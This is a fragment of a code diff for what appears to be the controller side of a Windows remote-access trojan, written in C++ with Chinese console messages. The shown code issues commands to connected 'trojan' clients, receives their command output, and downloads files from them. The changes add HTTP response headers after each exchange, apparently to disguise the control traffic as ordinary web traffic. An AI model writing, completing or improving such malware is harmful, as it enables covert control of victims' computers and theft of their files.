@@ -228,12 +228,12 @@ DWORD WINAPI InputThread(LPVOID lpParameter)
 		{
 			g_trojan_info[free_index].live_flag = 1;
 			//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
-			cout << "                                               *---------------------------*" << endl;
-			cout << "                                               |  请输入要发送的指令种类： |" << endl;
-			cout << "                                               |        1.普通指令         |" << endl;
-			cout << "                                               |      2.文件下载指令       |" << endl;
-			cout << "                                               *---------------------------*" << endl;
-			cout << "                                               >>>  "; 
+			cout << "                                            *---------------------------*" << endl;
+			cout << "                                            |  请输入要发送的指令种类： |" << endl;
+			cout << "                                            |        1.普通指令         |" << endl;
+			cout << "                                            |      2.文件下载指令       |" << endl;
+			cout << "                                            *---------------------------*" << endl;
+			cout << "                                            >>>  "; 
 			cin >> kind;
 			if (kind == 1)
 			{
@@ -361,6 +361,8 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			// recv cmd result from trojan
 			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
 			printf("接收到返回数据:  %s(%d)\n", recvbuf, iResult);//包含头，要去的话调用killhead就行
+			Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
+			if (Ret>0) cout << "返回Http响应," << strlen(protocolHead) << "字节" << endl;
 			break;
 		case CMD_DOWNLOAD:
 			cout << "执行文件下载" << endl;
@@ -387,6 +389,8 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			}
 			file = fopen(filename, "wb+");
 			if (file == NULL) { cout << "打开文件失败！" << endl; return -1; }
+			Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
+			if (Ret>0) cout << "返回Http响应," << strlen(protocolHead) << "字节" << endl;
 
 			int torecvlen = filelen;
 			// 持续接收数据，直到对方关闭连接 
@@ -415,6 +419,10 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 							buf++;
 						}					
 					torecvlen -= recvlen;
+
+					Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
+					if (Ret>0) cout << "返回Http响应," << strlen(protocolHead) << "字节" << endl;
+
 					if (torecvlen <= 0)break;
 
 					//情况1：成功接收到数据
